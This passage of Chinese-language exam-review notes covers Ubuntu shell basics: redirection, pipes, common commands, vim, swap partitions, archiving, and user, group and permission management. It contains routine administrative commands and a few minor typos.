——TAB键</p></li><li><p>自动输入历史命令 ——history命令</p></li><li><p>重定向</p><p>  让用户从文件输入命令，或将输出结果存储在文件及设备中，不需要输入输出设备</p><ul><li>输出重定向符**”&gt;”(写入并覆盖)<strong>和</strong>“&gt;&gt;”(追加)**，输入重定向符”&lt;”</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls -l &gt; test &#x2F;&#x2F;将执行结果写入test文件中，没有test就自动创建&#x2F;&#x2F;显示器无结果表示重定向成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>管道</p><blockquote><p>管道是一种通信机制，是一种特殊文件，可以进行读写。</p></blockquote><blockquote><p>除首尾的两个命令，每一个命令的输入都来自前一个命令的输出</p></blockquote><blockquote><p>“ <strong>|</strong> “ 将多个简单命令结合在一起，实现复杂的功能</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls -l | grep test &#x2F;&#x2F;查看当前目录下test的详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="P61-Shell常用命令-10个"><a href="#P61-Shell常用命令-10个" class="headerlink" title="P61: Shell常用命令 10个"></a>P61: Shell常用命令 10个</h4><p>（第四题考 书上命令要很了解）</p><ul><li><p><strong>ls 查看指定工作目录下的内容</strong></p><blockquote><p style="color:blue;">ls [选项] [路径]</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls -a&#x2F;-A 显示所有文件及目录，列出&#x2F;不列出隐藏文档(隐藏文档名称开头有&quot;.&quot;)ls -l 除文件名外，显示详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>pwd 查看当前工作目录的绝对路径</strong></p></li><li><p><strong>uname 查看当前系统内核信息</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">uname 显示内核名uname -r 显示内核版本号uname -o 显示系统信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>cd 切换目录</strong></p><blockquote><ul><li><p style="color:blue;">cd [路径]</p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cd &#x2F; &#x2F;&#x2F;切换到&#x2F;目录cd ~ &#x2F;&#x2F;切换到当前用户主目录cd .. &#x2F;&#x2F;切换到上一级目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>cat 显示文件内容</strong></p><blockquote><ul><li><p style="color:blue;">cat [选项] [文件] </p></li></ul></blockquote></li><li><p><strong>clear 清屏</strong></p></li><li><p><strong>sudo 切换用户身份执行</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$sudo adduser Me &#x2F;&#x2F;以root用户运行adduser命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>su 切换用户</strong></p><blockquote><ul><li><p style="color:blue;">sudo    [选项] [命令]    </p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$sudo su root &#x2F;&#x2F;切换到root用户#su Me &#x2F;&#x2F;切换到Me用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>ifconfig 显示和配置网络设备属性</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">interface 网络接口的名称，如eth0(网卡) ifconfig eth0 &#x2F;&#x2F;查看eth0的网络情况ifconfig eth0 up&#x2F;down &#x2F;&#x2F;激活或关闭eth0ifconfig eth0 192.168.0.25 netmask 255.255.255.0 &#x2F;&#x2F;设置eth0的IP地址和子网掩码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>man 系统帮助(命令的详细内容和使用方法)</p><blockquote><ul><li><p style="color:blue;">man [命令名]</p></li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">man ls &#x2F;&#x2F;查看ls命令的详细内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="P65-96-编辑器-2个"><a href="#P65-96-编辑器-2个" class="headerlink" title="P65-96: 编辑器 2个"></a>P65-96: 编辑器 2个</h4></li></ul><p>(编辑器的基本使用，考察，至少知道哪个是编辑器)</p><p><strong>1.Gedit编辑文档</strong></p><p>窗口四个部分：菜单栏、工具栏、文档编辑栏、状态栏</p><p>菜单栏：文件、编辑、查看、搜索、工具、文档、帮助</p><ul><li>文件：新建、打开、保存、保存为、还原、打印预览、打印、关闭、推出</li><li>编辑：撤销、重做、剪切、复制、粘贴、删除、全部选中、插入日期和时间、首选项</li><li>查看：……</li></ul><pre class="line-numbers language-none"><code class="language-none">gedit test.cpp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>“+” 前台运行</p><p>“&amp;” 后台运行，进入自己的编辑器 </p></blockquote><p><strong>2.VIM的使用和配置</strong></p><p><strong>3种工作模式：输入模式、指令模式、底行模式</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">vim test &#x2F;&#x2F;光标置于最后一行vim n test &#x2F;&#x2F;光标置于第n行vim pattern test &#x2F;&#x2F;光标置于第一个与pattern匹配的串处vim -r test &#x2F;&#x2F;发生系统崩溃，恢复文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>只读模式切输入模式</p><pre class="line-numbers language-none"><code class="language-none">i 光标前(光标在第一行第一列)a 光标后(光标在第一行第二列)I 当前行首A 当前行尾o&#x2F;O 当前行之下&#x2F;上新开一行r 替换当前字符……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>输入模式切指令模式 <strong>Ecs键</strong></p><pre class="line-numbers language-none"><code class="language-none">移动光标类指令：光标上移一行 k ; 光标下移一行 j光标左移一字符 h ; 光标右移一字符 l……屏幕翻滚类指令：Ctrl+u 文件首翻半屏……复制、删除、粘贴类指令：……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>指令模式切底行模式  <strong>: 或 ? 或 /</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;pattern 从光标开始处向文件尾搜索pattern?pattern 从光标开始处向文件首搜索pattern:w 保存  :x 保存并退出  :q 退出  :! 强制退出:q! 不保存文件并退出:wq 保存并退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p><strong>VIM配置</strong></p><p>定制VIM编辑器属性方便编写文档，配置文件地址为/etc/vim/vimrc，该文件会在启动时读取，该命令为底行模式命令，命令写入文件后使用时不必重复键入命令</p><p>更新最新vim版本(vim,vim-common,vim-doc,vim-runtiem)，切换到root权限下，打开vim配置文件(vim /etc/vim /vimrc)，将需要命令前的注释键#删除。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">syntax on 关键字高亮set tabstop&#x3D;4 按下tab键跳跃4个光标set background&#x3D;dark 更改背景为深色……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P77-挂载"><a href="#P77-挂载" class="headerlink" title="P77: 挂载"></a>P77: 挂载</h4><p>挂载：在Linux或UNIX系统中，<strong>任何个种类的文件系统被创建后，都需要挂载到某个特定的目录才能使用，这个过程相当于激活一个文件系统</strong>，使它能够被使用。</p><p>Linux使用<strong>mount工具</strong>来对文件系统进行挂载。挂载文件系统时需要明确挂载点，比如在安装Ubuntu的过程中，读者实际上已经接触过挂载的过程了，在创建文件系统后，操作系统会提示将此文件系统挂载至哪个位置，而这个位置就是挂载点，在那个时候，通常都选择挂载点为“/”，即根目录。此外，还可以利用该工具挂载其他种类的文件系统，也需要涉及挂载点的选择，挂载点的实质是一个空置的目录。</p><p>Windws文件系统的挂获原理是将磁盘分成若干分区，在各个分区中挂载文件系统。而Linux的挂载原理与Windows不同，它是将磁盘空间挂载在一个目录下。</p><h4 id="P81-swap交换分区"><a href="#P81-swap交换分区" class="headerlink" title="P81: swap交换分区"></a>P81: swap交换分区</h4><ul><li><p>什么是交换分区？</p><ul><li>在Linux中，交换分区是“虚拟内存”技术的集中体现。它代替了Windows中交换文件的概念，但实质都是<strong>利用硬盘空间，临时当作内存使用</strong></li><li>虚拟内存在功能上突破了物理内存的限制，是程序可以操纵大于实际物理内存的空间，更重要的是，虚拟内存是隔离每个进程的安全保护网，可以使每个进程都不受其他程序的干扰</li></ul></li><li><p><font color=Brown>怎么交换？有什么功能？交换多少合适？</font></p><ul><li><p>当系统的物理内存不够用的时候，才进行分区的交换。将物理内存中的一部分空间释放出来，以供当前运行的程序使用，被释放的空间的程序被临时保存到交换分区中，等到那些程序要运行时，再从交换分区中恢复保存的数据到内存中。被释放的空间可能来自一些很长时间没有什么操作的程序。</p></li><li><p>分配太多的交换分区会浪费磁盘空间，而交换分区太少，系统则会发生错误。通常情况下，交换分区应<strong>大于或等于物理内存的大小</strong>，最小<strong>不应小于64M</strong>，通常交换分区得大小应是物理内存(虚拟机的)得<strong>2~2.5倍</strong>。</p><blockquote><ul><li><p>不是所有物理内存中交换出来的数据都会被放到交换分区中，会导致不堪负重，有相当一部分数据会被直接交换到文件系统，如文件读写</p></li><li><p>交换分区是”匿名“内存数据的交换空间。”匿名“内存数据如malloc和new函数生成的对象的数据，以及堆栈中一些状态和变量数据等。malloc和new函数生成的对象的数据，即人为在内存上进行的空间操作，它们在文件系统中没有相应的”存储“文件，需要交换分区。</p></li></ul></blockquote></li></ul></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># swapon -s &#x2F;&#x2F;查看当前系统的交换分区情况Filename表示当前交换分区挂载的位置，Type表示该分区的文件格式，partition表示交换分区，&#x2F;dev&#x2F;sda5表示第一块硬盘的第一个扩展分区的第一个逻辑磁盘&#x2F;dev&#x2F;hda, &#x2F;dev&#x2F;hdb, &#x2F;dev&#x2F;sda, &#x2F;dev&#x2F;sdbhda一般是指IDE接口的硬盘，hda指第一块硬盘，hdb指第二块硬盘,等等；sda一般是指SATA接口的硬盘，sda指第一块硬盘，sdb指第二块硬盘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>交换分区的数量对性能有很大的影响。因为分区的交换操作是磁盘I/O的操作，多个交换分区可以轮流使用，均衡I/O的负载，而单一交换分区会很忙使系统大多数时间处于等待状态，效率很低。系统很慢，但CPU不忙，说明问题在I/O上。</li></ul><p><strong>交换分区的管理</strong></p><p>交换分区是分页管理的，每一页的大小和内存也得大小一样，以方便数据交换。</p><blockquote><p>旧版本实现交换分区，用交换分区第1页作为所有交换分区的一个”映射“，即第1页的每一位都对应一页交换分区。如果这一位是1，表示此页可用；如果这一位是0，表示此页是环块，不可用。</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ vmstat 3  &#x2F;&#x2F;每3秒捕获一次系统性能指标Procs下的r表示正在等待的进程数量（等待块），b表示输入输出Memory下的swpd表示使用的Swap空间的大小Swap下的si表示系统的交换回内存的总量，so表示CPU每秒交换总量以上指标的数值越大，表示系统越繁忙，其繁忙程度与系统具体的配置有关。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230209224236885.png"></p><p><font color="red"><strong>交换分区常用管理方法</strong></font> </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">1.切换为超级用户（管理员），cd到&#x2F;root目录下sudo su rootcd &#x2F;root2.创建一个swap文件（有连续空间的），其路径为&#x2F;root&#x2F;swapfiledd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;root&#x2F;swapfile bs&#x3D;1024 count&#x3D;65536(ls &#x2F;&#x2F;存在一个snap和swapfile文件)3.格式化swap分区mkswap swapfile &#x2F;&#x2F;将刚才建立的&#x2F;root&#x2F;swapfile文件格式化为swap格式4.激活swap分区swapon swapfile5.检查刚建立的交换分区文件是否存在swapon -s6.回收&#x2F;root&#x2F;swapfile文件所占用的交换空间swapoff swapfile7.删除&#x2F;root&#x2F;swapfile文件rm swapfile(永久创建 vim &#x2F;etc&#x2F;fstab)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P88-91-压缩和解压-3个"><a href="#P88-91-压缩和解压-3个" class="headerlink" title="P88-91: 压缩和解压 3个"></a>P88-91: 压缩和解压 3个</h4><ul><li><p><strong>zip和unzip</strong></p><ul><li><p>zip命令一般解压有规则特征的应用程序</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">zip -m abc.zip a b c &#x2F;&#x2F;-m:压缩后，删除原始文件(将文件移入压缩文件) zip -r test.zip test&#x2F; &#x2F;&#x2F;-r:递归处理，压缩指定目录下的所有文件和子目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>unzip解压</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">unzip abc.zip &#x2F;&#x2F;直接解压，压缩文件依然存在unzip -d test1 abc.zip &#x2F;&#x2F;-d&lt;目录&gt;:指定文件解压后的存储目录，没有的话新建unzip abc.zip -x a &#x2F;&#x2F;-x&lt;文件&gt;：指定压缩文件中不解压的文件unzip -l abc.zip &#x2F;&#x2F;-l:显示压缩文件所包含的文件unzip -Z abc.zip &#x2F;&#x2F;-Z:显示压缩文件中文件的具体信息，不解压<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>tar解压规则/不规则程序</strong></p><p>（1）-cvf：文件归档但不压缩</p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps15.jpg" alt="img" style="zoom: 67%;" /> </center>（2）gzip压缩和解压缩 -z</li></ul><p>-c：压缩；-x：解压缩</p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps16.jpg" alt="img" style="zoom: 67%;" /> </center>  <center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps17.jpg" alt="img" style="zoom:67%;" /> </center>（3）bzip2压缩和解压缩 -j<p>-c：压缩；-x：解压缩</p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps18.jpg" alt="img" style="zoom:67%;" /> </center>  <center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps19.jpg" alt="img" style="zoom:67%;" /> </center>#### P92：文件系统管理命令 6类20个<ol><li><p>文件的基本操作</p><ul><li><p><strong>touch 创建一个新文件，存在则修改文件最后修改日期</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">touch [参数] [文件名]touch a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>cp 复制一个或多个文件，也可以复制一个目录</strong></p><blockquote><ul><li><p style="color:blue;">touch [参数] [源地址] [目的地址]</p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cp a.cpp c.cpp &#x2F;&#x2F;复制a.cpp到当前目录c.cpp中-v 查看复制过程-i 询问，是否覆盖原来已经存在的同名文件-r 递归处理，实现目录复制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mv 移动文件或目录，也可以进行重命名</strong></p><blockquote><ul><li><p style="color:blue;">mv [参数] [源地址] [目的地址]</p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mv dir1&#x2F;a dir2&#x2F;mv b bbb &#x2F;&#x2F;b重命名为bbb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>rm 删除一个或多个文件，也可以递归删除目录</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">rm dir1&#x2F;bbbrm -ri dir1&#x2F; &#x2F;&#x2F;递归处理来删除目录，并询问<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>目录的基本操作</p><ul><li><p><strong>mkdir 创建一个目录</strong></p><blockquote><ul><li><p style="color:blue;">mkdir [参数] [目的地址]</p></li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">mkdir dir1 &#x2F;&#x2F;当前目录下创建一个目录mkdir -p dir2&#x2F;dir22&#x2F;dir222 &#x2F;&#x2F;-p实现多层目录的建立<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>rmdir 删除一个目录</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">rmdir dir1rmdir -p dir2&#x2F;dir22&#x2F;dir22 &#x2F;&#x2F;-p实现多层目录的全部删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>查看文件内容</p><ul><li><p><strong>more 在终端屏幕按屏显示文本文件</strong></p><p>   在终端屏幕显示文本文件：Enter一行，空格一屏（如果-num有参数，显示num行），q退出</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">more -8 &#x2F;etc&#x2F;passwd &#x2F;&#x2F;每屏显示8行ls &#x2F;etc&#x2F; | more -10 &#x2F;&#x2F;查看&#x2F;etc目录的文件信息，每屏显示10行-p 实现清屏-d 显示友好信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>less 在终端屏幕按屏显示文本文件</strong></p><p>  在终端屏幕显示文本文件，不能Enter和Space翻阅，增加：鼠标滑动显示内容；底部提示符为“ : ”</p><pre class="line-numbers language-none"><code class="language-none">ls &#x2F;etc&#x2F; | less<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>head 显示前几行或几字节</strong></p>  <img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210001613397.png" alt="image-20230210001613397" style="zoom:67%;" /></li><li><p><strong>tail 显示前/最后几行或几字节</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212191142439.png" alt="image-20230212191142439" style="zoom:67%;" /><p>（head和tail这两命令同理）</p></li><li><p>od 按照特殊格式查看文件内容</p><pre class="line-numbers language-none"><code class="language-none">字码基数 -d 十进制；-o 八进制(默认)；-x 十六进制 -t 设置输出格式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p>文件类型</p><ul><li><p><strong>文件类型</strong></p><p><font color="red"><strong>- 普通文件</strong>，<strong>d 目录</strong>，c 字符设备（串口设备：调制解调器），b 块设备（接口设备：硬盘、光驱），l 符号链接文件（快捷方式），s 套接口文件（网络通信文件），p 管道文件（FIFO文件，进程间通信机制）</font></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210003215624.png" alt="image-20230210003215624" style="zoom:67%;" /></li><li><p><strong>file 辨识文件类型</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210001908362.png" alt="image-20230210001908362" style="zoom:67%;" /></li></ul></li><li><p>查询文件</p><ol><li><p><strong>find 在目录结构中查找文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">find &#x2F;etc -name vim* &#x2F;&#x2F;查找文件名中以vim开头的所有文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>locate 查找符合条件的文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">locate cpuinfo &#x2F;&#x2F;查找含有cpuinfo的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>grep 查找包含指定关键字的文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">grep -ir &quot;Ubuntu&quot; &#x2F;user | less &#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol></li><li><p>其他管理命令</p><ul><li><p><strong>ln 创建连接文件</strong></p><blockquote><ul><li><p style="color:blue;">ln [参数] [目的地址] [链接文件名]</p></li></ul></blockquote><p><font color="blue">两种链接：硬链接和软连接：</font></p><ul><li><strong>硬链接利用每个文件分配的物理编号inode建立的，因此不能跨越文件系统。修改硬链接的目标文件名，链接依然有效；</strong></li></ul></li></ul></li></ol><ul><li><strong>软连接利用文件路径名建立链接，通常为绝对路径，增加可移植性。修改软链接目标文件名，链接将断开</strong> <img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210002324999.png" alt="image-20230210002324999" style="zoom:67%;" /></li><li><strong>wc 统计文件的字数、字节数、行数等信息</strong></li></ul>  <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">   wc -c 字节wc -l 行数   wc -w 字数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code> &lt;img src=&quot;https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212191405117.png&quot; alt=&quot;image-20230212191405117&quot; style=&quot;zoom:67%;&quot; /&gt;</code></pre><ul><li><strong>comm 逐行比较两个<font color="blue">已排序</font>文件的差异，并显示</strong></li><li><strong>diff 逐行比较文本文件的异同处</strong>逐行比较文本文件的异同处。指定比较目录，会比较相同文件名的文件，不会比较子目录</li></ul><h4 id="P105-Ubuntu用户系统概述"><a href="#P105-Ubuntu用户系统概述" class="headerlink" title="P105: Ubuntu用户系统概述"></a>P105: Ubuntu用户系统概述</h4><p>Ubuntu Linux系统是一个<font color="red">多用户、多任务的分时</font>操作系统</p><p><font color=Brown>Ubuntu用户类型:  3个</font></p><ul><li><font color=Brown>初次创建的用户：完成比普通用户多的功能</font></li><li><font color=Brown>root用户 #：系统管理员，完成对系统的所有管理功能，拥有最高权限</font></li><li><font color=Brown>普通用户 ~：在安装完操作系统后，被创建的其他所有用户</font></li></ul><p>查看各个用户的相关信息：<strong>配置文件/etc/passwd</strong></p><p><strong>记录当前操作系统中所有用户的基本信息：用户名、用户UID、用户组ID(GID)、主目录路径、登录Shell等。</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210004522336.png" alt="image-20230210004522336" style="zoom:67%;" /><h4 id="P113-用户管理命令"><a href="#P113-用户管理命令" class="headerlink" title="P113: 用户管理命令"></a>P113: 用户管理命令</h4><p>sudo和su的配置文件 /etc/sudoers</p><ol><li><p><font color=Brown><strong>添加用户 adduser</strong></font></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># adduser abc &#x2F;&#x2F;添加一个名为abc的普通用户# adduser --system --home &#x2F;home&#x2F;xyz --shell &#x2F;bin&#x2F;bash xyz &#x2F;&#x2F;添加一个名为xyx的系统用户，指定主目录为&#x2F;home&#x2F;xyz，默认shell为bash(ls &#x2F;home -&gt; abc xyz)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>显示用户信息  finger</strong></font></p><p>finger命令用于查找用户，并显示对应用户的相关信息</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># sudo apt install fingerfinger -l abc  &#x2F;&#x2F;列出用户abc的详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>更改用户密码 passwd</p><p>passwd命令用于更改用户密码。如果当前用户为普通用户，只更改自己密码；当前用户为超级管理员，能更改所有用户密码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">passwd abc &#x2F;&#x2F;更改用户abc的密码passwd -d abc &#x2F;&#x2F;删除用户abc的密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>修改用户登录信息 usermode</strong></font></p><p>usermode命令用于修改已添加到系统中的某个用户的登录名、主目录、默认shell等与登录相关的信息</p><pre class="line-numbers language-none"><code class="language-none">usermode -l abcd abc &#x2F;&#x2F;将用户abc改名为abcdfinger abc &#x2F;&#x2F;查找登录名为abc的用户，不存在<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>显示用户ID id</strong></font></p><p>id命令用于显示系统中某个用户的UID、GID等识别号信号。</p><pre class="line-numbers language-none"><code class="language-none">id root &#x2F;&#x2F;显示用户root的所有IDid -u abc &#x2F;&#x2F;显示用户abc的UID-g 组ID  -G 所有组ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>修改用户个人信息 chfn</p><p>chfn命令用于修改用户的基本个人信息，如真实姓名、电话号码等。</p><pre class="line-numbers language-none"><code class="language-none">chfn -f abcdefg abc &#x2F;&#x2F;将用户abc的真实姓名改为abcdefgchfn -h 1111111 abc &#x2F;&#x2F;设置用户abc的电话号码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>删除用户 deluser</strong></font></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">deluser --remove-all-files abc &#x2F;&#x2F;删除用户abc以及一切相关文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="P117-组管理命令"><a href="#P117-组管理命令" class="headerlink" title="P117: 组管理命令"></a>P117: 组管理命令</h4><p>cat /etc/passwd 看用户信息；cat /etc/group 看组相关信息</p><ol><li><p><strong>添加用户组 addgroup</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">addgroup abc &#x2F;&#x2F;添加一个普通用户组addgroup --system abc &#x2F;&#x2F;添加一个系统用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>显示组内用户 groups</p><p>groups命令用于显示某个组里包含的用户</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">groups root &#x2F;&#x2F;显示用户组root内的用户groups abc &#x2F;&#x2F;显示用户组abc内的用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>修改用户组信息 groupmod</strong></p><p>groupmod命令用于更改用户组的名称、ID等信息。</p><pre class="line-numbers language-none"><code class="language-none">groupmod -g 1002 abc &#x2F;&#x2F;更改用户组abc的GID为1002groupmod -n abcd abc &#x2F;&#x2F;更改用户组abc名称为abccat &#x2F;etc&#x2F;group | grep abc &#x2F;&#x2F;查看配置文件中abc信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>删除用户组 delgroup</strong></p><pre class="line-numbers language-none"><code class="language-none">delgroup abc &#x2F;&#x2F;删除用户组abc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="P118-权限管理"><a href="#P118-权限管理" class="headerlink" title="P118: 权限管理"></a>P118: 权限管理</h4><p>Ubuntu在管理自己的用户和文件时，都是依靠权限体系来提高安全性。</p><p>权限是指某一个用户或用户组能够使用系统资源的限制情况。root管理员拥有系统的最高权限；初次创建的用户拥有管理员的部分权限；其他普通用户的权限最低。</p><p><font color=Brown>对于文件，有读r、写w、修改x(可执行权限)三种权限。(二进制表示：100, 010, 001 ; <strong>八进制表示：4, 2, 1 -&gt; r+w+x=7，故7为最高权限</strong>)</font></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210225153846.png" alt="image-20230210225153846" style="zoom:50%;" /><ul><li>“drwxr-xr-x”表明了权限与用户组的关系，除第1位表示<strong>文件类型</strong>，剩余9位以3位为一组，分别表示<strong>文件归属用户的权限 u</strong>、归属用户组的权限 g、其他用户的权限 o。</li><li>“26”表示链接数</li><li>”bd bd”表示文件拥有者和该用户所归属的用户组</li></ul><pre class="line-numbers language-none"><code class="language-none">bd的3类用户和对应权限情况：它的拥有者是bd用户，对应权限是“rwx&quot;，对该文件具有读写修改的权限与bd用户同组的其他用户，对应权限是&quot;r-x&quot;，对该文件具有读和修改的权限其他用户，对应权限是&quot;r-x&quot;，对该文件具有读和修改的权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>权限字母表示法：</strong></p><table><thead><tr><th>字母</th><th>含义</th></tr></thead><tbody><tr><td>r, w, x 表示权限</td><td>可读，可写，可执行权限</td></tr><tr><td>a, u, g, o 表示文件归属关系</td><td>所有用户，归属用户，归属组，其他用户</td></tr><tr><td>=, +, - 表示权限变化</td><td>具备权限，添加某权限，去除某权限</td></tr></tbody></table><pre class="line-numbers language-none"><code class="language-none">例子：a+x：对所有用户添加可执行权限go-x：对归属组和其他用户去除原有可执行权限u&#x3D;rxw：对归属用户具备可读、可写、可执行权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong><font color=Brown>常用权限管理命令：</font></strong></p><p>利用shell命令，可以方便地查看文件和文件夹的权限，也可以方便地对权限作出修改，还可以对文件所属用户及群组进行修改</p><ul><li><p><strong>chmod 修改文件或文件夹的权限</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">字母表示法：chmod a+w a.cpp &#x2F;&#x2F;对a.cpp文件的所有用户增加可写权限数字表示法：chmod 777 test &#x2F;&#x2F;修改目录test的权限为777，即所有用户都拥有可读、可写、可执行权限-R实现对目录下的文件权限的递归修改：chmod -cR 755 test&#x2F; &#x2F;&#x2F;将test目录下所有文件权限改为755，包括目录本身，使用-c参数显示修改结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>chown修改文件或目录的归属用户或归属组</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chown abc a.cpp &#x2F;&#x2F;修改a.cpp文件的归属用户为abcchown -c abc.abc a.cpp &#x2F;&#x2F;同时改变a.cpp文件的归属用户和用户组chown -v .abc a.cpp 